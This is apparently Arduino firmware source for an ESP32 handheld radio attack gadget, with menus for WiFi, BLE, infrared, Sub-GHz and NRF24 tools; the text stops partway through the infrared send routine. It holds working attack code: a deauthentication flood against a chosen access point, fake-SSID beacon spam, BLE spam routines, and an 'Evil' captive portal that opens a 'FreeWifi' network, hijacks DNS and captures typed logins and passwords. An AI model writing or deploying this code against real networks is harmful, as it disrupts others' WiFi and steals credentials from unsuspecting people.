#include <Arduino.h>
#include <Wire.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include <NimBLEDevice.h>
#include <IRrecv.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>
#include <IRutils.h>
#include <SD.h>
#include <SPI.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include "pinout.h"
#include "ble_spam.h"
#include "subghz_extra.h"
#include "subghz_raw_send.h" 
#include "nrf24_extra.h"

#define MAX_RAW_SAMPLES 512 
int rawSamples[MAX_RAW_SAMPLES];
int rawSampleCount = 0;

String capturedLogin = "Wait...";
String capturedPass = "Wait...";

extern "C" {
  int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);
}


U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE);

IRrecv irrecv(IR_RX);
decode_results results;
IRsend irsend(IR_TX);
RCSwitch mySwitch;

DNSServer dnsServer;
WebServer webServer(80);
String portalHtmlContent = "";

SPIClass sdSPI(HSPI);

bool sdReady = false;
bool cc1101Ready = false;

bool lastUpState = HIGH;
bool lastDownState = HIGH;
bool lastOkState = HIGH;
bool lastBackState = HIGH;

bool isPressed(int pin, bool &lastState) {
  bool currentState = digitalRead(pin);

  if (lastState == HIGH && currentState == LOW) {
    lastState = currentState;
    return true;
  }

  lastState = currentState;
  return false;
}

bool saveSubReadToSD(const char* protoName, unsigned long code, float freq) {
  if (!sdReady) return false;

  if (!SD.exists("/subghz")) {
    if (!SD.mkdir("/subghz")) return false;
  }


  String fileName = "";
  for (int i = 1; i <= 99; i++) {
    char path[32];
    snprintf(path, sizeof(path), "/subghz/Key_%02d.sub", i);
    if (!SD.exists(path)) {
      fileName = String(path);
      break;
    }
  }

  if (fileName == "") return false;

  File file = SD.open(fileName.c_str(), FILE_WRITE);
  if (!file) return false;


  String f_proto = String(protoName);
  f_proto.toUpperCase();
  if (f_proto == "RCSWITCH") f_proto = "Princeton"; 
  

  int bits = (code > 0xFFFFFF) ? 24 : 12;
  if (f_proto == "CAME") bits = 12;
  if (f_proto == "NICE") bits = 12;

  
  file.println("Filetype: Flipper SubGhz Key File");
  file.println("Version: 1");
  
  
  file.print("Frequency: ");
  file.println((unsigned long)(freq * 1000000));
  
  file.println("Preset: FuriHalSubGhzPresetOok650Async");
  file.print("Protocol: ");
  file.println(f_proto);
  
  file.print("Bit: ");
  file.println(bits);
  
  
  file.print("Key: ");
  
  uint8_t bytes[8];
  for(int j=0; j<8; j++) {
     
      if (j < 4) bytes[7-j] = (code >> (j*8)) & 0xFF;
      else bytes[7-j] = 0;
  }
  
  for(int j=0; j<8; j++) {
      if (bytes[j] < 0x10) file.print("0");
      file.print(bytes[j], HEX);
      if(j < 7) file.print(" ");
  }
  file.println();
  
 
  file.println("TE: 320"); 

  file.close();
  return true;
}

bool saveSubRawToSD(float freq) {
  if (!sdReady) return false;
  if (rawSampleCount == 0) return false;

  if (!SD.exists("/subghz")) {
    if (!SD.mkdir("/subghz")) return false;
  }

  String fileName = "";
  for (int i = 1; i <= 99; i++) {
    char path[32];
    snprintf(path, sizeof(path), "/subghz/Raw_%02d.sub", i);
    if (!SD.exists(path)) {
      fileName = String(path);
      break;
    }
  }

  if (fileName == "") return false;

  File file = SD.open(fileName.c_str(), FILE_WRITE);
  if (!file) return false;

 
  file.println("Filetype: Flipper SubGhz RAW File");
  file.println("Version: 1");
  
  
  file.print("Frequency: ");
  file.println((unsigned long)(freq * 1000000));
  
  file.println("Preset: FuriHalSubGhzPresetOok650Async");
  file.println("Protocol: RAW");
  
 
  file.print("RAW_Data: ");
  for (int i = 0; i < rawSampleCount; i++) {
    file.print(rawSamples[i]);
    file.print(" ");
  }
  file.println();

  file.close();
  return true;
}

bool retrySDInit() {
  sdSPI.end();
  delay(100);
  
  pinMode(SD_MISO, INPUT_PULLUP); 
  sdSPI.begin(SD_SCK, SD_MISO, SD_MOSI, SD_CS);
  delay(200);

 
  sdReady = SD.begin(SD_CS, sdSPI, 4000000);
  return sdReady;
}






enum State { MAIN_MENU, WIFI_MENU, BLE_MENU, SUBGHZ_MENU, IR_MENU, NRF_MENU };
State currentState = MAIN_MENU;
int cursor = 0;

int animatedY = 0;


const char* mainItems[] = {"WIFI", "BLE", "SUB-GHZ", "INFRARED", "NRF24"};
const char* wifiItems[] = {"Deauth", "Scan", "Beacon", "Packet", "Portal"};
const char* bleItems[] = {"IOS spam", "Android spam", "Windows spam"};
const char* irItems[] = {"Read", "Send", "TV universal", "PJ universal", "Jammer"};
const char* subghzItems[] = {"Read", "Raw", "Send", "Analyzer", "BruteForce","Jammer"};
const char* nrfItems[] = {"Spectrum", "Jammer"};
const char* ssidList[] = {"lol", "6767", "mell", "rickroll", "isee", "meyou", "omaigad", "PisunF6", "okak", "gazan6767", "loading...", "free wifi", "My lan bruh", "password 12345", "Virus.exe on my wifi", "not a virus", "Connecting...", "Error 404", "FBI Surveillance Van", "Get your own WiFi", "Skynet Global Defense", "Searching...", "No Internet Access", "NASA Public", "Pizza Hut Guest", "Hidden Network", "Area 51", "5G Tower Test", "Matrix Guest", "Unknown Device", "Keep it legal"};



uint8_t deauthPacket[26] = {
  0xC0,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0,0,0,0,0,0,
  0,0,0,0,0,0,
  0x00,0x00,0x07,0x00
};



struct TVCode {
  const char* name;
  uint32_t code;
  uint16_t bits;
};

TVCode tvCodes[] = {
  {"Samsung",           0xE0E040BF, 32},
  {"LG / GoldStar",     0x20DF10EF, 32},
  {"Xiaomi (Mi TV)",    0x00FF02FD, 32},
  {"Harper Smart",      0x00FB30CF, 32},
  {"Harper Basic",      0x7F8012ED, 32},
  {"TCL / Hisense",     0xF708FB04, 32},
  {"Sony",              0x00000A90, 12},
  {"Toshiba",           0x02FD48B7, 32},
  {"Sharp",             0x41A201FE, 32},
  {"Panasonic",         0x0100BCBD, 32},
  {"BBK / Supra",       0x00FF0CF3, 32},
  {"Philips",           0x00FF40BF, 32}
};  

const int tvCodesCount = sizeof(tvCodes) / sizeof(tvCodes[0]);

struct PJCode {
  const char* name;
  uint32_t code;
  uint16_t bits;
};

PJCode pjCodes[] = {
  {"Epson Toggle",         0x414232CD, 32},
  {"Epson On",             0x414210EF, 32},
  {"Epson Off",            0x414211EE, 32},
  {"BenQ Toggle",          0x008412ED, 32},
  {"BenQ On",              0x008402FD, 32},
  {"BenQ Off",             0x008403FC, 32},
  {"Optoma Toggle",        0x32CD02FD, 32},
  {"Optoma On",            0x32CD40BF, 32},
  {"Optoma Off",           0x32CD41BE, 32},
  {"Acer Toggle",          0x8166817E, 32},
  {"ViewSonic Toggle",     0x831311EE, 32},
  {"InFocus Toggle",       0x22DD20DF, 32},
  {"NEC PJ Toggle",        0x181802FD, 32},
  {"XGIMI / Wanbo",        0x00FF02FD, 32}
};

const int pjCodesCount = sizeof(pjCodes) / sizeof(pjCodes[0]);

float subghzFrequencies[] = {315.00, 433.92, 868.00, 915.00};
const int subghzFreqCount = 4;

struct Star {
  uint8_t x;
  uint8_t y;
};

Star stars[22];

void initStars() {
  for (int i = 0; i < 22; i++) {
    stars[i].x = random(2, 126);
    stars[i].y = random(2, 62);
  }
}

void drawStars() {
  for (int i = 0; i < 22; i++) {
    u8g2.drawPixel(stars[i].x, stars[i].y);
  }
}

const char* getProtocolName(int proto) {
  switch (proto) {
    case 1: return "princeton";
    case 2: return "rcswitch";
    case 3: return "came";
    case 4: return "nice";
    case 5: return "holtec";
    case 6: return "ansonic";
    case 7: return "chamberlain";
    case 8: return "starline";
    case 9: return "keeloq";
    default: return "unknown";
  }
}

void drawText(const char* text, int y) {
  u8g2.drawStr(0, y, text);
}

void runDeauth() {
  u8g2.clearBuffer();
 
  drawStars();
  drawText("Scanning...", 20);
  u8g2.sendBuffer();

  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();
  if (n == 0) return;

  int targetIdx = 0;
  bool selected = false;

  while (!selected) {
    u8g2.clearBuffer();
    drawStars();
    drawText("Select:", 10);

    for (int i = 0; i < (n > 5 ? 5 : n); i++) {
      char line[32];
      sprintf(line, "%s %s", (i == targetIdx ? ">" : " "), WiFi.SSID(i).c_str());
      drawText(line, 25 + i * 10);
    }

    u8g2.sendBuffer();

    if (digitalRead(BTN_DOWN) == LOW) { targetIdx = (targetIdx + 1) % n; delay(150); }
    if (digitalRead(BTN_OK) == LOW) { selected = true; delay(200); }
    if (digitalRead(BTN_BACK) == LOW) return;
  }

  uint8_t* bssid = WiFi.BSSID(targetIdx);
  int channel = WiFi.channel(targetIdx);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  for (int i = 0; i < 6; i++) {
    deauthPacket[10 + i] = bssid[i];
    deauthPacket[16 + i] = bssid[i];
  }

  while (digitalRead(BTN_BACK) == HIGH) {
    u8g2.clearBuffer();
    drawStars();
    drawText("Attacking...", 20);
    drawText(WiFi.SSID(targetIdx).c_str(), 40);
    u8g2.sendBuffer();

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(10);
  }
}

void runWiFiScan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(200);

  const int maxSaved = 100;

  String foundSSIDs[maxSaved];
  String foundBSSIDs[maxSaved];
  int foundChannels[maxSaved];
  int foundRSSI[maxSaved];
  int totalFound = 0;


  for (int ch = 1; ch <= 14; ch++) {
    unsigned long startMs = millis();

    u8g2.clearBuffer();
	drawStars();
    u8g2.drawFrame(0, 0, 128, 64);
    u8g2.drawStr(8, 28, "Scanning...");
    u8g2.drawStr(8, 46, "Please wait");

    char chText[16];
    snprintf(chText, sizeof(chText), "CH:%d", ch);
    int w = u8g2.getStrWidth(chText);
    u8g2.drawStr(128 - w - 6, 12, chText);

    u8g2.sendBuffer();

    int n = WiFi.scanNetworks(false, true, false, 2000, ch);

    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0) ssid = "<hidden>";

      String bssid = WiFi.BSSIDstr(i);
      int netCh = WiFi.channel(i);
      int rssi = WiFi.RSSI(i);

      bool exists = false;
      for (int j = 0; j < totalFound; j++) {
        if (foundBSSIDs[j] == bssid) {
          exists = true;
          foundRSSI[j] = rssi;
          break;
        }
      }

      if (!exists && totalFound < maxSaved) {
        foundSSIDs[totalFound] = ssid;
        foundBSSIDs[totalFound] = bssid;
        foundChannels[totalFound] = netCh;
        foundRSSI[totalFound] = rssi;
        totalFound++;
      }
    }

    WiFi.scanDelete();

    unsigned long elapsed = millis() - startMs;
    if (elapsed < 2000) {
      delay(2000 - elapsed);
    }

    if (digitalRead(BTN_BACK) == LOW) {
      return;
    }
  }

  if (totalFound == 0) {
    while (digitalRead(BTN_BACK) == HIGH) {
      u8g2.clearBuffer();
	  drawStars();
      u8g2.drawFrame(0, 0, 128, 64);
      u8g2.drawStr(18, 28, "No networks");
      u8g2.drawStr(16, 50, "BACK - exit");
      u8g2.sendBuffer();
      delay(30);
    }
    return;
  }

  int selected = 0;
  const int visibleLines = 4;

  while (digitalRead(BTN_BACK) == HIGH) {
    if (digitalRead(BTN_DOWN) == LOW) {
      selected = (selected + 1) % totalFound;
      delay(150);
    }

    if (digitalRead(BTN_UP) == LOW) {
      selected = (selected - 1 + totalFound) % totalFound;
      delay(150);
    }

    int start = 0;
    if (selected >= visibleLines) {
      start = selected - visibleLines + 1;
    }

    u8g2.clearBuffer();
	drawStars();
    u8g2.drawFrame(0, 0, 128, 64);

    char counter[16];
    snprintf(counter, sizeof(counter), "[%d/%d]", selected + 1, totalFound);
    u8g2.drawStr(6, 12, counter);

    for (int i = 0; i < visibleLines; i++) {
      int idx = start + i;
      if (idx >= totalFound) break;

      String name = foundSSIDs[idx];
      if (name.length() > 9) {
        name = name.substring(0, 9);
      }

      char line[28];
      snprintf(line, sizeof(line), "%s c%-2d %s",
               (idx == selected ? ">" : " "),
               foundChannels[idx],
               name.c_str());

      u8g2.drawStr(6, 24 + i * 10, line);
    }

    u8g2.sendBuffer();
    delay(30);
  }
}

void runBeaconSpam() {
  
  WiFi.mode(WIFI_MODE_NULL);
  delay(100);

  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_promiscuous(true);

  uint8_t basePacket[] = {
    0x80, 0x00,                         
    0x00, 0x00,                         
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 

    
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,

    
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,

    0x00, 0x00,                         

    
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 
    0x64,0x00,                         
    0x01,0x04,                         

    
    0x00,                              
    0x00,                              

    

    
    0x01, 0x08,
    0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,

    
    0x03, 0x01, 0x01
  };

  while (digitalRead(BTN_BACK) == HIGH) {

    for (int i = 0; i < 31; i++) {

      const char* ssid = ssidList[i];
      int len = strlen(ssid);

      uint8_t packet[128];
      memcpy(packet, basePacket, sizeof(basePacket));

      
      for (int j = 0; j < 6; j++) {
        uint8_t mac = random(0, 256);
        packet[10 + j] = mac; 
        packet[16 + j] = mac; 
      }

      
      packet[37] = len;

      
      memcpy(&packet[38], ssid, len);

      
      int offset = 38 + len;

      
      packet[offset++] = 0x01;
      packet[offset++] = 0x08;
      packet[offset++] = 0x82;
      packet[offset++] = 0x84;
      packet[offset++] = 0x8b;
      packet[offset++] = 0x96;
      packet[offset++] = 0x24;
      packet[offset++] = 0x30;
      packet[offset++] = 0x48;
      packet[offset++] = 0x6c;

      
      packet[offset++] = 0x03;
      packet[offset++] = 0x01;

      uint8_t ch = random(1, 12);
      packet[offset++] = ch;

      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

      
      esp_wifi_80211_tx(WIFI_IF_STA, packet, offset, false);

      delay(2);
    }
  }

  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

volatile int packetCount = 0;


void wifi_sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  packetCount++;
}

void runWiFiPacket() {
  u8g2.clearBuffer();
  drawStars();
  u8g2.drawStr(0, 20, "Scanning...");
  u8g2.sendBuffer();

  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks();

  if (n == 0) return;

  int selected = 0;
  const int visibleLines = 5;

  
  while (true) {
    if (digitalRead(BTN_DOWN) == LOW) { selected = (selected + 1) % n; delay(150); }
    if (digitalRead(BTN_UP) == LOW) { selected = (selected - 1 + n) % n; delay(150); }
    if (digitalRead(BTN_OK) == LOW) break;
    if (digitalRead(BTN_BACK) == LOW) return;

    int start = 0;
    if (selected >= visibleLines) {
      start = selected - visibleLines + 1;
    }

    u8g2.clearBuffer();
    u8g2.drawStr(0, 10, "Select AP:");

    for (int i = 0; i < visibleLines; i++) {
      int idx = start + i;
      if (idx >= n) break;

      char line[32];
      snprintf(line, sizeof(line), "%s %s",
               (idx == selected ? ">" : " "),
               WiFi.SSID(idx).c_str());
      u8g2.drawStr(0, 25 + i * 10, line);
    }

    u8g2.sendBuffer();
    delay(30);
  }

  int channel = WiFi.channel(selected);

  WiFi.mode(WIFI_MODE_NULL);
  delay(100);

  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  int graph[128] = {0};

  while (digitalRead(BTN_BACK) == HIGH) {
    packetCount = 0;
    delay(100);

    int value = packetCount;

    
    if (value > 120) value = 120;

    
    int boosted = value * 2;
    if (boosted > 120) boosted = 120;

    
    for (int i = 0; i < 127; i++) {
      graph[i] = graph[i + 1];
    }
    graph[127] = boosted;

    u8g2.clearBuffer();


    char chText[16];
    snprintf(chText, sizeof(chText), "[CH:%d]", channel);
    u8g2.setFont(u8g2_font_5x8_tf);
    u8g2.drawStr(0, 8, chText);

    
    u8g2.drawHLine(0, 63, 128);

    
    for (int x = 0; x < 128; x++) {
      int h = map(graph[x], 0, 120, 0, 55);

      
      u8g2.drawLine(x, 63, x, 63 - h);

      
      if (h > 20 && x < 127) {
        u8g2.drawPixel(x, 63 - h);
      }
    }

    u8g2.sendBuffer();
  }

  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}


void handleRoot() {
  
  if (webServer.hasArg("email")) capturedLogin = webServer.arg("email");
  else if (webServer.hasArg("login")) capturedLogin = webServer.arg("login");
  else if (webServer.hasArg("user")) capturedLogin = webServer.arg("user");
  else if (webServer.hasArg("username")) capturedLogin = webServer.arg("username");

  if (webServer.hasArg("password")) capturedPass = webServer.arg("password");
  else if (webServer.hasArg("pass")) capturedPass = webServer.arg("pass");
  else if (webServer.hasArg("key")) capturedPass = webServer.arg("key");

  
  webServer.send(200, "text/html", portalHtmlContent);
}

void runEvilPortal() {
 
  while(digitalRead(BTN_OK) == LOW) delay(10);
  delay(200);

  if (!sdReady) {
    u8g2.clearBuffer(); drawStars(); u8g2.drawStr(10,30,"SD Error"); u8g2.sendBuffer(); delay(1000); return;
  }

  if (!SD.exists("/Evil")) SD.mkdir("/Evil");

  
  String files[20];
  int fileCount = 0;
  
  File dir = SD.open("/Evil");
  File entry = dir.openNextFile();
  while (entry && fileCount < 20) {
    if (!entry.isDirectory()) {
      String name = String(entry.name());
      if (name.startsWith("/Evil/")) name.replace("/Evil/", "");
      files[fileCount++] = name;
    }
    entry.close();
    entry = dir.openNextFile();
  }
  dir.close();

  if (fileCount == 0) {
    u8g2.clearBuffer(); drawStars(); u8g2.drawStr(5,30,"No HTML in /Evil"); u8g2.sendBuffer(); delay(2000); return;
  }

  int selected = 0;
  bool fileSelected = false;

  while(!fileSelected) {
    if (digitalRead(BTN_DOWN) == LOW) { selected = (selected + 1) % fileCount; delay(150); }
    if (digitalRead(BTN_UP) == LOW) { selected = (selected - 1 + fileCount) % fileCount; delay(150); }
    if (digitalRead(BTN_BACK) == LOW) return;
    
    if (digitalRead(BTN_OK) == LOW) {
      fileSelected = true;
      delay(200);
    }

    u8g2.clearBuffer(); drawStars();
    u8g2.drawStr(0, 10, "Select HTML:");
    for (int i = 0; i < 4; i++) {
      int idx = selected + i;
      if (idx >= fileCount) break;
      String name = files[idx];
      if(name.length() > 14) name = name.substring(0, 14);
      u8g2.drawStr(0, 25 + i * 10, ((idx == selected ? "> " : "  ") + name).c_str());
    }
    u8g2.sendBuffer();
    delay(30);
  }

  
  u8g2.clearBuffer(); drawStars(); u8g2.drawStr(10,30,"Loading..."); u8g2.sendBuffer();
  
  File htmlFile = SD.open("/Evil/" + files[selected], FILE_READ);
  if (!htmlFile) return;
  portalHtmlContent = htmlFile.readString();
  htmlFile.close();

  
  capturedLogin = "Wait...";
  capturedPass = "Wait...";

  
  WiFi.mode(WIFI_AP);
  WiFi.softAP("FreeWifi"); 
  delay(100);

  dnsServer.start(53, "*", WiFi.softAPIP());

  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.onNotFound(handleRoot); 
  webServer.begin();

  
  while (digitalRead(BTN_BACK) == HIGH) {
    dnsServer.processNextRequest();
    webServer.handleClient();

    u8g2.clearBuffer();
    drawStars();
    
    u8g2.setFont(u8g2_font_6x12_tf);
    
    
    u8g2.drawStr(0, 15, "Login:");
    u8g2.drawStr(0, 27, capturedLogin.c_str());
    
    
    u8g2.drawStr(0, 42, "Pass:");
    u8g2.drawStr(0, 54, capturedPass.c_str());
    
    
    u8g2.setFont(u8g2_font_4x6_tf);
    u8g2.drawStr(80, 63, "BACK=EXIT");
    
    u8g2.sendBuffer();
    delay(10);
  }

  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
}


void runBLEIosSpam() {  
  NimBLEDevice::init("");
  WiFi.mode(WIFI_OFF);
  u8g2.clearBuffer();
  drawStars();
  drawText("IOS SPAM", 20);
  u8g2.sendBuffer();

  NimBLEDevice::init("");

  while (digitalRead(BTN_BACK) == HIGH) {
    executeSpam(AppleJuice);
    delay(100);
  }

  NimBLEDevice::deinit(true);
}

void runBLEAndrSpam() {
  NimBLEDevice::init("");
  WiFi.mode(WIFI_OFF);
  u8g2.clearBuffer();
  drawStars();
  drawText("Android SPAM", 20);
  u8g2.sendBuffer();

  NimBLEDevice::init("");

  while (digitalRead(BTN_BACK) == HIGH) {
    executeSpam(Google);
    delay(100);
  }

  NimBLEDevice::deinit(true);
}

void runBLEWindSpam() {
  NimBLEDevice::init("");
  WiFi.mode(WIFI_OFF);
  u8g2.clearBuffer();
  drawStars();
  drawText("Windows SPAM", 20);
  u8g2.sendBuffer();

  NimBLEDevice::init("");

  while (digitalRead(BTN_BACK) == HIGH) {
    executeSpam(Microsoft);
    delay(100);
  }

  NimBLEDevice::deinit(true);
}

void runIRReceiver() {
  irrecv.enableIRIn();

  
  while(digitalRead(BTN_OK) == LOW) delay(10);
  delay(200);
  // -------------------

  String irProto = "";
  String irName = "";
  uint32_t irAddress = 0;
  uint32_t irCommand = 0;
  bool hasSignal = false;

  while (digitalRead(BTN_BACK) == HIGH) {
    if (irrecv.decode(&results)) {

      hasSignal = true;
      irAddress = results.address;
      irCommand = results.command;

      
      switch (results.decode_type) {
        case NEC:
          
          if (irAddress > 0xFF) {
            irProto = "NECext";
          } else {
            irProto = "NEC";
          }
          break;
        case SAMSUNG:
          irProto = "Samsung32";
          break;
        case RC6:
          irProto = "RC6";
          break;
        default:
          irProto = "NEC"; 
          break;
      }

     
      switch (irCommand) {
        case 0x02: irName = "Power"; break;
        case 0x03: irName = "Power"; break;
        case 0x08: irName = "Vol_up"; break;
        case 0x09: irName = "Vol_dn"; break;
        case 0x07: irName = "Mute"; break;
        case 0x1A: irName = "Ch_next"; break;
        case 0x1B: irName = "Ch_prev"; break;
        case 0x12: irName = "Menu"; break;
        case 0x11: irName = "Source"; break;
        case 0x10: irName = "OK"; break;
        case 0x13: irName = "Return"; break;
        case 0x20: irName = "Up"; break;
        case 0x21: irName = "Down"; break;
        case 0x22: irName = "Left"; break;
        case 0x23: irName = "Right"; break;
        default:
          
          char nameBuf[16];
          snprintf(nameBuf, sizeof(nameBuf), "Btn_%02X", irCommand);
          irName = String(nameBuf);
          break;
      }

      
      u8g2.clearBuffer();
      drawStars();
      drawText("IR RECEIVER", 10);

      String line1 = "Proto: " + irProto;
      
      char addrBuf[20];
      snprintf(addrBuf, sizeof(addrBuf), "Addr: %02X %02X %02X %02X",
        (uint8_t)(irAddress & 0xFF),
        (uint8_t)((irAddress >> 8) & 0xFF),
        (uint8_t)((irAddress >> 16) & 0xFF),
        (uint8_t)((irAddress >> 24) & 0xFF));

      char cmdBuf[20];
      snprintf(cmdBuf, sizeof(cmdBuf), "Cmd:  %02X %02X %02X %02X",
        (uint8_t)(irCommand & 0xFF),
        (uint8_t)((irCommand >> 8) & 0xFF),
        (uint8_t)((irCommand >> 16) & 0xFF),
        (uint8_t)((irCommand >> 24) & 0xFF));

      u8g2.drawStr(0, 24, line1.c_str());
      u8g2.drawStr(0, 36, addrBuf);
      u8g2.drawStr(0, 48, cmdBuf);
      u8g2.drawStr(0, 62, "OK=SAVE BACK=EXIT");
      u8g2.sendBuffer();

      irrecv.resume();
    }

    
    if (digitalRead(BTN_OK) == LOW && hasSignal) {
      delay(200);

      if (!sdReady) {
        u8g2.clearBuffer(); drawStars();
        drawText("SD ERROR", 30);
        u8g2.sendBuffer(); delay(1000);
        continue;
      }

      if (!SD.exists("/infrared")) SD.mkdir("/infrared");

      
      String fileName = "";
      for (int i = 1; i <= 99; i++) {
        char path[32];
        snprintf(path, sizeof(path), "/infrared/%02d.ir", i);
        if (!SD.exists(path)) {
          fileName = String(path);
          break;
        }
      }

      if (fileName == "") {
        u8g2.clearBuffer(); drawStars();
        drawText("IR FULL", 30);
        u8g2.sendBuffer(); delay(1500);
        continue;
      }

      File file = SD.open(fileName, FILE_WRITE);
      if (file) {
        
        file.println("Filetype: IR signals file");
        file.println("Version: 1");
        file.println("#");

        
        file.print("name: ");
        file.println(irName);

        
        file.println("type: parsed");

       
        file.print("protocol: ");
        file.println(irProto);

       
        char addrLine[32];
        snprintf(addrLine, sizeof(addrLine), "address: %02X %02X %02X %02X",
          (uint8_t)(irAddress & 0xFF),
          (uint8_t)((irAddress >> 8) & 0xFF),
          (uint8_t)((irAddress >> 16) & 0xFF),
          (uint8_t)((irAddress >> 24) & 0xFF));
        file.println(addrLine);

       
        char cmdLine[32];
        snprintf(cmdLine, sizeof(cmdLine), "command: %02X %02X %02X %02X",
          (uint8_t)(irCommand & 0xFF),
          (uint8_t)((irCommand >> 8) & 0xFF),
          (uint8_t)((irCommand >> 16) & 0xFF),
          (uint8_t)((irCommand >> 24) & 0xFF));
        file.println(cmdLine);

        file.close();

        u8g2.clearBuffer(); drawStars();
        drawText("SAVED:", 20);
        drawText(fileName.c_str(), 40);
        u8g2.sendBuffer();
      } else {
        u8g2.clearBuffer(); drawStars();
        drawText("WRITE FAIL", 30);
        u8g2.sendBuffer();
      }
      delay(1500);
      hasSignal = false; 
    }

    delay(50);
  }

  irrecv.disableIRIn();
}

void runIRSend() {
  if (!sdReady) {
    while (digitalRead(BTN_BACK) == HIGH) {
      u8g2.clearBuffer(); drawStars();
      drawText("SD ERROR", 24); drawText("BACK - exit", 44);
      u8g2.sendBuffer(); delay(50);
    }
    return;
  }

 
  while(digitalRead(BTN_OK) == LOW) { delay(10); } 
  delay(200); 
  

  if (!SD.exists("/infrared")) {
    while (digitalRead(BTN_BACK) == HIGH) {
      u8g2.clearBuffer(); drawStars();
      drawText("NO /infrared", 24); drawText("BACK - exit", 44);
      u8g2.sendBuffer(); delay(50);
    }
    return;
  }

  String files[20];
  int fileCount = 0;

  File dir = SD.open("/infrared");
  if (!dir || !dir.isDirectory()) return;

  File entry = dir.openNextFile();
  while (entry && fileCount < 20) {
    if (!entry.isDirectory()) {
      String name = String(entry.name());
      if (name.startsWith("/infrared/")) name.replace("/infrared/", "");
      files[fileCount++] = name;
    }
    entry.close();
    entry = dir.openNextFile();
  }
  dir.close();

  if (fileCount == 0) return;

  int selected = 0;
  while (true) {
    if (digitalRead(BTN_DOWN) == LOW) { selected = (selected + 1) % fileCount; delay(150); }
    if (digitalRead(BTN_UP) == LOW) { selected = (selected - 1 + fileCount) % fileCount; delay(150); }
    if (digitalRead(BTN_BACK) == LOW) return;

    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      String fullPath = "/infrared/" + files[selected];
      File file = SD.open(fullPath.c_str(), FILE_READ);
      if (!file) continue;

      
      String protocol = "";
      uint8_t addrBytes[4] = {0, 0, 0, 0};
      uint8_t cmdBytes[4] = {0, 0, 0, 0};

      while(file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();

        if(line.startsWith("protocol:")) {
          protocol = line.substring(9);
          protocol.trim();
        }
        else if(line.startsWith("address:")) {
          
          String val = line.substring(8);
          val.trim();
          int idx = 0;
          int startPos = 0;
          for(int i = 0; i <= (int)val.length() && idx < 4; i++) {
            if(i == (int)val.length() || val[i] == ' ') {
              if(i > startPos) {
                String byteStr = val.substring(startPos, i);
                addrBytes[idx] = (uint8_t)strtoul(byteStr.c_str(), NULL, 16);
                idx++;
              }
              startPos = i + 1;
            }
          }
        }
        else if(line.startsWith("command:")) {
          String val = line.substring(8);
          val.trim();
          int idx = 0;
          int startPos = 0;
          for(int i = 0; i <= (int)val.length() && idx < 4; i++) {
            if(i == (int)val.length() || val[i] == ' ') {
              if(i > startPos) {
                String byteStr = val.substring(startPos, i);
                cmdBytes[idx] = (uint8_t)strtoul(byteStr.c_str(), NULL, 16);
                idx++;
              }
              startPos = i + 1;
            }
          }
        }
      }
      file.close();

      
      if (protocol == "NEC" || protocol == "NECext") {
 
        
        uint8_t addr = addrBytes[0];
        uint8_t cmd = cmdBytes[0];
        
    
        uint64_t necCode = 0;
        necCode |= ((uint64_t)addr);
        necCode |= ((uint64_t)(~addr & 0xFF)) << 8;
        necCode |= ((uint64_t)cmd) << 16;
        necCode |= ((uint64_t)(~cmd & 0xFF)) << 24;
        
  
        for(int r = 0; r < 3; r++) {
          irsend.sendNEC(necCode, 32);
          delay(40);
        }
      }
      else if (protocol == "Samsung32") {
        uint8_t addr = addrBytes[0];
        uint8_t cmd = cmdBytes[0];
        
        
        uint64_t samCode = 0;
        samCode |= ((uint64_t)addr);
        samCode |= ((uint64_t)addr) << 8;
        samCode |= ((uint64_t)cmd) << 16;
        samCode |= ((uint64_t)(~cmd & 0xFF)) << 24;
        
        for(int r = 0; r < 3; r++) {
          irsend.sendSamsung36(samCode);
          delay(40);
        }
      }
      else if (protocol == "RC6") {
        uint8_t addr = addrBytes[0];
        uint8_t cmd = cmdBytes[0];
        
        
        uint64_t rc6Code = ((uint64_t)addr << 8) | cmd;
        
        for(int r = 0; r < 3; r++) {
          irsend.sendRC6(rc6Code, 20);
          delay(40);
        }
      }
      else {
        
        uint8_t addr = addrBytes[0];
        uint8_t cmd = cmdBytes[0];
        uint64_t necCode = 0;
        necCode |= ((uint64_t)addr);
        necCode |= ((uint64_t)(~addr & 0xFF)) << 8;
        necCode |= ((uint64_t)cmd) << 16;
        necCode |= ((uint64_t)(~cmd & 0xFF)) << 24;
        
        for(int r = 0; r < 3; r++) {
          irsend.sendNEC(necCode, 32);
          delay(40);
        }
      }

      u8g2.clearBuffer(); drawStars();
      drawText("IR SENT", 20);
      drawText(protocol.c_str(), 35);
      drawText(files[selected].c_str(), 50);
      u8g2.sendBuffer();
